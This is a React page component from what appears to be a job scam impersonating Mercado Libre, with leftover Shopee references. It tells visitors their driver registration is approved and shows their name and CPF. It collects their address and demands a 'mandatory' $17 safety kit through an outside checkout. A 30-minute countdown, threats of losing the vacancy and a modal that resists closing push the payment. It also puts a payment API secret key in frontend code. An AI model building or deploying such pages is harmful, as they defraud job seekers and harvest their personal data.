import React, { useState, useEffect, useRef } from 'react';
import { addDays, format } from 'date-fns';
import { ptBR } from 'date-fns/locale';
import { useLocation } from 'wouter';

import Header from '@/components/Header';
import Footer from '@/components/Footer';
import Breadcrumb from '@/components/Breadcrumb';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { useToast } from '@/hooks/use-toast';
import { z } from 'zod';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
import { Spinner } from '@/components/ui/spinner';
import { useScrollTop } from '@/hooks/use-scroll-top';
import { API_BASE_URL } from '../lib/api-config';
import { createPixPayment } from '../lib/payments-api';
import { initFacebookPixel, trackEvent, trackPurchase, checkPaymentStatus } from '../lib/facebook-pixel';

import kitEpiImage from '../assets/kit-epi-new.webp';
import kitEpiMercadoLibre from '../assets/kit-epi-new.webp';
import pixLogo from '../assets/pix-logo.png';

import KIT_EPI from "@assets/KIT EPI.webp";

// Interface para o endereço do usuário
interface EnderecoUsuario {
  cep: string;
  logradouro: string;
  bairro: string;
  cidade: string;
  estado: string;
  numero: string;
  complemento: string;
}

// Interface para os dados do usuário
interface DadosUsuario {
  nome: string;
  cpf: string;
}

// Interface para o QR Code PIX
interface PixQRCode {
  pixCode: string;
  pixQrCode: string;
  id: string;
}

// Schema para o formulário de endereço
const enderecoSchema = z.object({
  cep: z.string().min(8, 'CEP inválido').max(9, 'CEP inválido'),
  logradouro: z.string().min(1, 'Logradouro é obrigatório'),
  bairro: z.string().min(1, 'Bairro é obrigatório'),
  cidade: z.string().min(1, 'Cidade é obrigatória'),
  estado: z.string().min(2, 'Estado é obrigatório'),
  numero: z.string().min(1, 'Número é obrigatório'),
  complemento: z.string().optional(),
});

type EnderecoFormValues = z.infer<typeof enderecoSchema>;

const Entrega: React.FC = () => {
  // Hook para navegação
  const [, setLocation] = useLocation();
  
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  // Inicializar o Facebook Pixel
  useEffect(() => {
    initFacebookPixel();
    
    // Verificar se há um pagamento em andamento
    const currentPaymentId = localStorage.getItem('current_payment_id');
    if (currentPaymentId) {
      console.log('[ENTREGA] Encontrado pagamento em andamento:', currentPaymentId);
      setTimeout(() => {
        verificarStatusPagamento(currentPaymentId);
      }, 3000);
    }
  }, []);
  
  const [endereco, setEndereco] = useState<EnderecoUsuario | null>(null);
  const [dadosUsuario, setDadosUsuario] = useState<DadosUsuario | null>(null);
  const [dataEntrega, setDataEntrega] = useState<string>('');
  const [showPaymentModal, setShowPaymentModal] = useState(false);
  const [pixInfo, setPixInfo] = useState<PixQRCode | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState<number>(30 * 60); // 30 minutos em segundos
  const timerRef = useRef<number | null>(null);
  const [showCloseWarning, setShowCloseWarning] = useState(false);
  const [acceptedTerms, setAcceptedTerms] = useState(false);
  const { toast } = useToast();

  // Configuração do formulário
  const { register, handleSubmit, setValue, formState: { errors }, reset } = useForm<EnderecoFormValues>({
    resolver: zodResolver(enderecoSchema),
    defaultValues: {
      cep: '',
      logradouro: '',
      bairro: '',
      cidade: '',
      estado: '',
      numero: '',
      complemento: '',
    }
  });

  // Efeito para carregar dados iniciais
  // Efeito para controlar o cronômetro de 30 minutos
  useEffect(() => {
    if (pixInfo && timeLeft > 0) {
      timerRef.current = window.setInterval(() => {
        setTimeLeft(prev => {
          if (prev <= 1) {
            if (timerRef.current) clearInterval(timerRef.current);
            return 0;
          }
          return prev - 1;
        });
      }, 1000) as unknown as number;
    }
    
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, [pixInfo, timeLeft]);
  
  useEffect(() => {
    // Recuperar o CEP salvo no localStorage
    const cepData = localStorage.getItem('shopee_delivery_cep_data');
    if (cepData) {
      try {
        const { cep, city, state } = JSON.parse(cepData);
        
        console.log("CEP recuperado do localStorage:", cep);
        
        // Buscar dados completos do CEP
        fetchCepData(cep);
      } catch (error) {
        console.error("Erro ao processar cepData:", error);
      }
    }

    // Recuperar dados do usuário
    const userData = localStorage.getItem('candidato_data');
    if (userData) {
      try {
        const parsedUserData = JSON.parse(userData);
        console.log("Dados do usuário recuperados:", parsedUserData);
        
        setDadosUsuario({
          nome: parsedUserData.nome,
          cpf: parsedUserData.cpf
        });
      } catch (error) {
        console.error("Erro ao processar userData:", error);
      }
    }

    // Calcular data de entrega (5 dias a partir de hoje)
    const hoje = new Date();
    const dataEntregaObj = addDays(hoje, 5);
    const dataFormatada = format(dataEntregaObj, "EEEE, dd/MM/yyyy", { locale: ptBR });
    setDataEntrega(dataFormatada.charAt(0).toUpperCase() + dataFormatada.slice(1));
  }, []);

  // Função para buscar dados do CEP
  const fetchCepData = async (cep: string) => {
    try {
      const cleanCep = cep.replace(/\D/g, '');
      const response = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
      const data = await response.json();
      
      if (!data.erro) {
        const novoEndereco = {
          cep: data.cep,
          logradouro: data.logradouro,
          bairro: data.bairro,
          cidade: data.localidade,
          estado: data.uf,
          numero: '',
          complemento: '',
        };
        
        setEndereco(novoEndereco);
        
        // Preencher formulário
        setValue('cep', data.cep);
        setValue('logradouro', data.logradouro);
        setValue('bairro', data.bairro);
        setValue('cidade', data.localidade);
        setValue('estado', data.uf);
      } else {
        toast({
          title: "CEP não encontrado",
          description: "Não foi possível localizar o endereço com o CEP informado.",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error('Erro ao buscar CEP:', error);
      toast({
        title: "Erro ao buscar endereço",
        description: "Ocorreu um erro ao tentar buscar o endereço. Tente novamente.",
        variant: "destructive",
      });
    }
  };

  // Não usamos mais a geração local de códigos PIX
  // Todos os pagamentos serão processados pela API For4Payments

  // Handler para o formulário de endereço
  const onSubmitEndereco = async (data: EnderecoFormValues) => {
    try {
      // Salvar endereço completo
      localStorage.setItem('endereco_entrega', JSON.stringify(data));
      
      // Rastrear evento de checkout iniciado no Facebook Pixel
      initFacebookPixel();
      trackEvent('InitiateCheckout', {
        content_name: 'Kit de Seguridad Oficial',
        content_ids: ['kit-seguridad-oficial'],
        content_type: 'product',
        value: 17,
        currency: 'USD'
      });
      
      // Redirecionar para Monetizze checkout
      window.open('https://app.monetizze.com.br/checkout/DUQ349961', '_blank');
      
    } catch (error: any) {
      console.error("Erro ao processar redirecionamento:", error);
      toast({
        title: "Erro",
        description: "Não foi possível processar o redirecionamento. Tente novamente.",
        variant: "destructive",
      });
    }
  };


  // Função para formatar o tempo restante
  const formatTime = (seconds: number): string => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  // Função para copiar código PIX para área de transferência
  const copiarCodigoPix = () => {
    if (pixInfo?.pixCode) {
      navigator.clipboard.writeText(pixInfo.pixCode);
      toast({
        title: "Código PIX copiado!",
        description: "O código PIX foi copiado para a área de transferência.",
      });
    }
  };
  
  // Função para verificar o status do pagamento diretamente na For4Payments
  const verificarStatusPagamento = async (paymentId: string) => {
    console.log('[ENTREGA] Verificando status do pagamento:', paymentId);
    
    // Obter a chave de API For4Payments via variável de ambiente específica para frontend
    const apiKey = import.meta.env.VITE_FOR4PAYMENTS_SECRET_KEY;
    
    if (apiKey) {
      try {
        // Usar a função que verifica diretamente do frontend
        const { success, data: statusData } = await checkPaymentStatus(paymentId, apiKey);
        
        if (success && statusData) {
          console.log('[ENTREGA] Status obtido diretamente:', statusData);
          
          // Se aprovado, relatar diretamente do frontend para o Facebook
          if (statusData.status === 'APPROVED') {
            console.log('[ENTREGA] Pagamento APROVADO! Rastreando conversão do frontend...');
            
            // Rastrear o evento de compra no Facebook Pixel
            const amount = statusData.amount ? parseFloat(statusData.amount) / 100 : 79.90;
            trackPurchase(paymentId, amount);
            
            // Exibir mensagem de sucesso para o usuário
            toast({
              title: "Pagamento aprovado!",
              description: "Seu pagamento foi confirmado com sucesso!",
            });
            
            // Também notifica o backend para fins de registro
            try {
              await fetch(`${API_BASE_URL}/api/payments/${paymentId}/check-status`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
              });
            } catch (err) {
              console.warn('[ENTREGA] Falha ao notificar backend, mas evento já foi enviado do frontend');
            }
            
            // Redirecionar para a página de treinamento
            console.log('[ENTREGA] Redirecionando para página de treinamento...');
            setTimeout(() => {
              setLocation('/treinamento');
            }, 1000);
          } else {
            // Se não está aprovado, agendar nova verificação em 30 segundos
            setTimeout(() => {
              verificarStatusPagamento(paymentId);
            }, 30000);
          }
        }
      } catch (error) {
        console.error('[ENTREGA] Erro ao verificar status:', error);
        
        // Em caso de erro, agendar nova tentativa em 60 segundos
        setTimeout(() => {
          verificarStatusPagamento(paymentId);
        }, 60000);
      }
    } else {
      // Sem a chave API no frontend, tentar via backend
      try {
        const response = await fetch(`${API_BASE_URL}/api/payments/${paymentId}?check_status=true`);
        if (response.ok) {
          const data = await response.json();
          
          if (data.status === 'APPROVED') {
            // Mesmo sem acesso direto à API, rastreamos o evento do frontend
            initFacebookPixel();
            trackPurchase(paymentId, 79.90);
            
            toast({
              title: "Pagamento aprovado!",
              description: "Seu pagamento foi confirmado com sucesso!"
            });
            
            // Redirecionar para a página de treinamento
            console.log('[ENTREGA] Redirecionando para página de treinamento via verificação backend...');
            setTimeout(() => {
              setLocation('/treinamento');
            }, 1000);
          } else {
            // Se não está aprovado, agendar nova verificação em 30 segundos
            setTimeout(() => {
              verificarStatusPagamento(paymentId);
            }, 30000);
          }
        }
      } catch (error) {
        console.error('[ENTREGA] Erro na verificação via backend:', error);
        
        // Em caso de erro, agendar nova tentativa em 60 segundos
        setTimeout(() => {
          verificarStatusPagamento(paymentId);
        }, 60000);
      }
    }
  };

  return (
    <div className="bg-white min-h-screen flex flex-col">
      <Header />
      <Breadcrumb />
      <div className="flex-grow container mx-auto px-4 py-8">
        <div className="w-full max-w-4xl mx-auto">
          <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
              <h3 className="font-semibold text-[#E83D22]">Estado del Registro</h3>
            </div>
            <div className="p-6">
              <div className="flex flex-col md:flex-row gap-6">
                <div className="w-full space-y-4">
                  <div className="bg-green-50 p-4 rounded-md border border-green-200 mb-4">
                    <div className="flex items-center">
                      <div className="text-green-500 mr-3">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
                          <polyline points="22 4 12 14.01 9 11.01"></polyline>
                        </svg>
                      </div>
                      <div>
                        <h4 className="text-lg font-medium text-green-700">Aprobado - Esperando Kit de Seguridad</h4>
                        <p className="text-sm text-green-600">Tu registro ha sido aprobado y está esperando la confirmación del kit.</p>
                      </div>
                    </div>
                  </div>
                  
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                      <h4 className="text-gray-700 font-medium mb-2">Datos del Conductor</h4>
                      <div className="bg-gray-50 p-4 rounded-md">
                        <p className="text-gray-600"><span className="font-medium">Nombre:</span> {dadosUsuario?.nome || 'No informado'}</p>
                        <p className="text-gray-600"><span className="font-medium">Licencia:</span> {dadosUsuario?.cpf || 'No informado'}</p>
                      </div>
                    </div>
                    
                    <div>
                      <h4 className="text-gray-700 font-medium mb-2">Próximos Pasos</h4>
                      <div className="bg-gray-50 p-4 rounded-md">
                        <ul className="list-disc pl-5 space-y-1 text-gray-600">
                          <li>Adquirir Kit de Seguridad oficial</li>
                          <li>Esperar entrega en hasta 5 días hábiles</li>
                          <li>Comenzar a recibir entregas en tu región</li>
                        </ul>
                      </div>
                    </div>
                  </div>
                  
                  <div className="mt-6">
                    <p className="text-sm text-gray-500 italic">
                      Importante: Tan pronto como se entregue el Kit de Seguridad, ya estarás habilitado para 
                      comenzar a realizar entregas inmediatamente por Mercado Libre.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
          
          <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
            <div className="bg-[#F0F7FF] p-4 border-b border-[#3483FA20]">
              <h3 className="font-semibold text-[#3483FA]">Equipo de Protección Personal (EPP)
</h3>
            </div>
            <div className="p-6">
              <div className="flex flex-col md:flex-row gap-6 items-center">
                <div className="w-full md:w-2/5">
                  <img 
                    src={KIT_EPI} 
                    alt="Kit EPI Mercado Libre" 
                    className="w-full rounded-lg"
                  />
                </div>
                <div className="w-full md:w-3/5">
                  <h4 className="text-lg font-medium mb-3">Kit Completo para Conductores</h4>
                  <p className="text-gray-600 mb-4">
                    Para garantizar tu seguridad durante las entregas, Mercado Libre requiere que todos los conductores 
                    utilicen equipos de protección individual. El kit incluye:
                  </p>
                  <ul className="list-disc pl-5 mb-4 space-y-1 text-gray-700">
                    <li>2 Chalecos reflectivos con identificación Mercado Libre (azul y amarillo)</li>
                    <li>Par de guantes de protección</li>
                    <li>Botas de seguridad antideslizantes</li>
                  </ul>
                  <div className="bg-yellow-50 p-3 rounded-md border border-yellow-200 mb-4">
                    <p className="text-sm text-yellow-800">
                      <strong>Importante:</strong> El uso del kit completo es obligatorio durante todas 
                      las entregas. El no uso puede resultar en suspensión temporal.
                    </p>
                  </div>
                  <div className="bg-orange-50 p-4 rounded-md border border-orange-200 mb-2">
                    <p className="text-gray-700">
                      <span className="font-medium">Fecha estimada de entrega:</span> <span className="text-[#E83D22] font-medium">{dataEntrega}</span>
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
          
          <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
            <div className="bg-[#F0F7FF] p-4 border-b border-[#3483FA20]">
              <h3 className="font-semibold text-[#3483FA]">Dirección para Entrega</h3>
            </div>
            <div className="p-6">
              <form onSubmit={handleSubmit(onSubmitEndereco)} className="space-y-6">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label htmlFor="cep" className="block text-sm font-medium text-gray-700 mb-1">Código Postal</label>
                    <Input
                      id="cep"
                      {...register('cep')}
                      placeholder="00000-000"
                      className={errors.cep ? 'border-red-500' : ''}
                    />
                    {errors.cep && (
                      <p className="mt-1 text-sm text-red-600">{errors.cep.message}</p>
                    )}
                  </div>
                  
                  <div>
                    <label htmlFor="numero" className="block text-sm font-medium text-gray-700 mb-1">
                      Número
                    </label>
                    <Input
                      id="numero"
                      {...register('numero')}
                      placeholder="Número"
                      className={errors.numero ? 'border-red-500' : ''}
                    />
                    {errors.numero && (
                      <p className="mt-1 text-sm text-red-600">{errors.numero.message}</p>
                    )}
                  </div>
                </div>
                
                <div>
                  <label htmlFor="logradouro" className="block text-sm font-medium text-gray-700 mb-1">
                    Dirección
                  </label>
                  <Input
                    id="logradouro"
                    {...register('logradouro')}
                    placeholder="Calle, Avenida, etc."
                    className={errors.logradouro ? 'border-red-500' : ''}
                  />
                  {errors.logradouro && (
                    <p className="mt-1 text-sm text-red-600">{errors.logradouro.message}</p>
                  )}
                </div>
                
                <div>
                  <label htmlFor="complemento" className="block text-sm font-medium text-gray-700 mb-1">
                    Complemento (opcional)
                  </label>
                  <Input
                    id="complemento"
                    {...register('complemento')}
                    placeholder="Apto, Edificio, etc."
                  />
                </div>
                
                <div>
                  <label htmlFor="bairro" className="block text-sm font-medium text-gray-700 mb-1">
                    Barrio
                  </label>
                  <Input
                    id="bairro"
                    {...register('bairro')}
                    placeholder="Barrio"
                    className={errors.bairro ? 'border-red-500' : ''}
                  />
                  {errors.bairro && (
                    <p className="mt-1 text-sm text-red-600">{errors.bairro.message}</p>
                  )}
                </div>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label htmlFor="cidade" className="block text-sm font-medium text-gray-700 mb-1">
                      Ciudad
                    </label>
                    <Input
                      id="cidade"
                      {...register('cidade')}
                      placeholder="Ciudad"
                      className={errors.cidade ? 'border-red-500' : ''}
                    />
                    {errors.cidade && (
                      <p className="mt-1 text-sm text-red-600">{errors.cidade.message}</p>
                    )}
                  </div>
                  
                  <div>
                    <label htmlFor="estado" className="block text-sm font-medium text-gray-700 mb-1">
                      Estado
                    </label>
                    <Input
                      id="estado"
                      {...register('estado')}
                      placeholder="Estado"
                      className={errors.estado ? 'border-red-500' : ''}
                    />
                    {errors.estado && (
                      <p className="mt-1 text-sm text-red-600">{errors.estado.message}</p>
                    )}
                  </div>
                </div>
                
                <div className="bg-[#FFF8F6] p-4 rounded-md border border-[#E83D2220] mb-4">
                  <div className="flex items-start">
                    <div className="text-[#E83D22] mr-3 mt-1">
                      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="8" x2="12" y2="12"></line>
                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
                      </svg>
                    </div>
                    <div>
                      <h4 className="text-sm font-medium text-[#E83D22]">Información Importante:</h4>
                      <p className="text-sm text-gray-700">
                        Para activar tu registro y convertirte en conductor de Mercado Libre, es obligatorio la adquisición del 
                        Kit Oficial de Conductor de Mercado Libre. El kit se entrega a precio de costo por <strong>$17</strong>.
                      </p>
                    </div>
                  </div>
                </div>
                
                {/* Box de alerta sobre o kit de segurança obrigatório */}
                <div className="bg-red-50 border border-red-200 rounded-md p-4 mb-4">
                  <div className="flex items-start">
                    <div className="text-red-500 mt-0.5 mr-3">
                      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="8" x2="12" y2="12"></line>
                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
                      </svg>
                    </div>
                    <div>
                      <h4 className="text-red-800 font-medium text-sm"><strong>ATENCIÓN:</strong> Acepta los términos y luego haz clic en "Comprar y Activar Registro".</h4>
                      <p className="text-red-700 text-sm mt-1">
                        El pago del Kit de Seguridad del Conductor es <strong>obligatorio</strong> y necesitas 
                        adquirir este kit oficial para ejercer la función de conductor de Mercado Libre.
                      </p>
                      <p className="text-red-700 text-sm mt-2">
                        Al continuar, te comprometes a realizar el pago vía PIX en un plazo de 30 minutos, 
                        de lo contrario, perderás el derecho a la vacante de conductor.
                      </p>
                      
                      {/* Botão on/off (switch) */}
                      <div className="mt-4 flex items-center">
                        <div className="mr-1 flex-shrink-0 w-[75px]">
                          <button 
                            className={`relative inline-flex h-7 w-16 items-center rounded-full transition-colors focus:outline-none ${acceptedTerms ? 'bg-green-500' : 'bg-gray-300'}`}
                            onClick={() => setAcceptedTerms(!acceptedTerms)}
                            type="button"
                          >
                            <span
                              className={`inline-block h-6 w-6 transform rounded-full bg-white shadow-md transition-transform ${acceptedTerms ? 'translate-x-9' : 'translate-x-1'}`}
                            />
                          </button>
                        </div>
                        <span className="ml-1 text-sm font-medium text-gray-700">
                          Acepto los términos y me comprometo a realizar el pago
                        </span>
                      </div>
                    </div>
                  </div>
                </div>
                
                <Button
                  type="submit"
                  className={`w-full text-white font-medium py-6 text-base rounded-[3px] transition-all ${acceptedTerms ? 'bg-[#3483FA] hover:bg-[#2968D7]' : 'bg-[#3483FA80] cursor-not-allowed'}`}
                  style={{ height: '50px' }}
                  disabled={!acceptedTerms}
                >
                  Comprar y Activar Registro
                </Button>
              </form>
            </div>
          </div>
        </div>
      </div>
      <Footer />
      {/* Modal de Pagamento PIX */}
      <Dialog 
        open={showPaymentModal} 
        onOpenChange={(open) => {
          if (!open && pixInfo) {
            // Se está tentando fechar o modal e temos um pixInfo, mostrar aviso
            setShowCloseWarning(true);
            // Não fechamos o modal, mantemos ele aberto
          } else {
            setShowPaymentModal(open);
          }
        }}
      >
        <DialogContent className="sm:max-w-md h-[100vh] max-h-screen overflow-y-auto p-2">
          <DialogHeader className="pb-1">
            <DialogTitle className="text-center text-sm">Pago del Kit de Seguridad</DialogTitle>
            <DialogDescription className="text-center text-xs">
              Finaliza el pago para activar tu registro de Mercado Libre
            </DialogDescription>
          </DialogHeader>
          
          {isLoading ? (
            <div className="flex flex-col items-center justify-center py-8 bg-[#FDE80F] bg-opacity-20 rounded-lg">
              <img 
                src="https://i.postimg.cc/j5Mnz0Tm/mercadolibre-logo-7-D54-D946-AE-seeklogo-com.png" 
                alt="Mercado Libre"
                className="h-12 w-auto object-contain mb-4"
              />
              <div className="animate-spin h-8 w-8 border-3 border-[#3483FA] border-t-transparent rounded-full"></div>
              <p className="mt-4 text-[#3483FA] font-loewe-next-body font-medium">Generando código QR para pago...</p>
            </div>
          ) : pixInfo ? (
            <div className="space-y-3">
              {/* Cabeçalho com imagem e dados */}
              <div className="flex flex-row gap-2 items-start">
                <div className="flex-shrink-0">
                  <img 
                    src={kitEpiImage} 
                    alt="Kit EPI Shopee" 
                    className="w-16 rounded-md"
                  />
                </div>
                <div className="flex-grow">
                  <h3 className="text-sm font-medium text-gray-800">Kit de Seguridad Oficial</h3>
                  <p className="text-md font-bold text-[#3483FA]">$17</p>
                  
                  <div className="w-full mt-1">
                    <p className="text-xs text-gray-600">
                      <span className="font-medium">Nombre:</span> {dadosUsuario?.nome}
                    </p>
                    <p className="text-xs text-gray-600">
                      <span className="font-medium">Licencia:</span> {dadosUsuario?.cpf}
                    </p>
                  </div>
                </div>
              </div>
              
              {/* Status de pagamento com spinner */}
              <div className="flex items-center justify-center gap-2 py-1">
                <div className="text-[#3483FA] animate-spin">
                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M21 12a9 9 0 1 1-6.219-8.56" />
                  </svg>
                </div>
                <p className="text-xs text-[#3483FA] font-medium font-loewe-next-body">
                  Esperando pago PIX...
                </p>
              </div>
              
              {/* QR Code */}
              <div className="flex flex-col justify-center h-[35vh]">
                <div className="flex flex-col items-center justify-center mb-2">
                  <img 
                    src={pixLogo}
                    alt="PIX Logo"
                    className="h-7 mb-2 mx-auto"
                  />
                  <img 
                    src={pixInfo.pixQrCode} 
                    alt="QR Code PIX" 
                    className="w-full max-w-[160px] h-auto mx-auto"
                  />
                </div>
                
                {/* Tempo restante */}
                <div className="bg-[#fff3e6] border-[#E83D22] border p-2 rounded-md mt-1 w-[75%] mx-auto">
                  <div className="flex items-center justify-center gap-2">
                    <div className="text-[#E83D22]">
                      <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <circle cx="12" cy="12" r="10"></circle>
                        <polyline points="12 6 12 12 16 14"></polyline>
                      </svg>
                    </div>
                    <div className="flex flex-col">
                      <p className="text-xs text-gray-700 font-medium">
                        PIX expira em <span className="text-[#E83D22] font-bold">{formatTime(timeLeft)}</span>
                      </p>
                    </div>
                  </div>
                </div>
              </div>
              
              {/* Código PIX e botão copiar */}
              <div className="h-[20vh]">
                <p className="text-xs text-gray-600 mb-1 text-center">
                  Copia el código PIX:
                </p>
                <div className="relative">
                  <div 
                    className="bg-gray-50 p-2 rounded-md border border-gray-200 text-xs text-gray-600 break-all pr-8 max-h-[70px] overflow-y-auto"
                  >
                    {pixInfo.pixCode}
                  </div>
                  <Button
                    variant="ghost"
                    className="absolute right-1 top-1/2 transform -translate-y-1/2 text-[#E83D22] hover:text-[#d73920] p-1"
                    onClick={copiarCodigoPix}
                  >
                    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                    </svg>
                  </Button>
                </div>
                
                <div className="mt-2">
                  <Button
                    onClick={copiarCodigoPix}
                    className="bg-[#E83D22] hover:bg-[#d73920] text-white font-medium py-1 w-full text-xs rounded-[3px] shadow-md transform active:translate-y-0.5 transition-transform"
                    style={{ 
                      boxShadow: "0 4px 0 0 #c23218",
                      border: "none",
                      position: "relative",
                      top: "0"
                    }}
                  >
                    Copiar Código PIX
                  </Button>
                </div>
              </div>
              
              {/* Instruções */}
              <div className="bg-yellow-50 p-2 rounded-md border border-yellow-200">
                <p className="text-xs text-yellow-800 text-center">
                  Después del pago, tu registro será activado automáticamente en hasta 5 minutos.
                </p>
              </div>
            </div>
          ) : null}
        </DialogContent>
      </Dialog>
      {/* Modal de aviso ao tentar fechar */}
      <Dialog open={showCloseWarning} onOpenChange={setShowCloseWarning}>
        <DialogContent className="sm:max-w-md p-6 flex flex-col gap-4">
          <div className="flex items-center justify-center text-[#E83D22] mb-2">
            <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="10"></circle>
              <line x1="12" y1="8" x2="12" y2="12"></line>
              <line x1="12" y1="16" x2="12.01" y2="16"></line>
            </svg>
          </div>
          
          <DialogTitle className="text-center text-base text-[#3483FA]">¡Atención!</DialogTitle>
          
          <div className="text-center space-y-2">
            <p className="text-sm text-gray-800 font-medium">
              Tu registro aún no está activo porque falta únicamente el Kit de Seguridad Oficial de los Conductores.
            </p>
            <p className="text-sm text-gray-700">
              Si no realizas el pago ahora, podrías perder la vacante para otro interesado.
            </p>
          </div>
          
          <Button 
            onClick={() => setShowCloseWarning(false)}
            className="mt-4 bg-[#3483FA] hover:bg-[#2968D7] py-2 text-white font-medium shadow-lg transform active:translate-y-0.5 transition-transform"
            style={{ 
              boxShadow: "0 4px 0 0 #1e5ba8",
              border: "none"
            }}
          >
            OK, entendido
          </Button>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Entrega;